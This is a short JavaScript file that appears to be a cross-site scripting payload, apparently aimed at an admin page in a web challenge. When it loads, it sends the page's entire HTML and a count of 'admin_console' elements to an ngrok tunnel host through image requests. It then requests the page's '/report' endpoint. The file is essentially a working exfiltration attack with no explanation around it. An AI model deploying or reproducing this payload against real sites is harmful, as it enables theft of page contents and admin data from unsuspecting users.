
function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
    document.body.appendChild(img);
}
function addTheImage2() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
    document.body.appendChild(img);
}

function addTheImage3() {           
          let xhr = new XMLHttpRequest();
	// 2. Configure it: GET-request for the URL /article/.../load
	xhr.open('GET', window.location.pathname+"/report");
	// 3. Send the request over the network
	xhr.send();          
        xhr.onload = function() {
	  if (xhr.status != 200) { // analyze HTTP status of the response
	    alert(`Error ${xhr.status}: ${xhr.statusText}`); // e.g. 404: Not Found
	  } else { // show the result
	    alert(`Done, got ${xhr.response} bytes`); // response is the server
	
	  }
	};

	xhr.onprogress = function(event) {
	  if (event.lengthComputable) {
	    alert(`Received ${event.loaded} of ${event.total} bytes`);
	  } else {
	    alert(`Received ${event.loaded} bytes`); // no Content-Length
	  }

	};

	xhr.onerror = function() {
	  alert("Request failed");
	};
}

addTheImage();
addTheImage2();
addTheImage3();

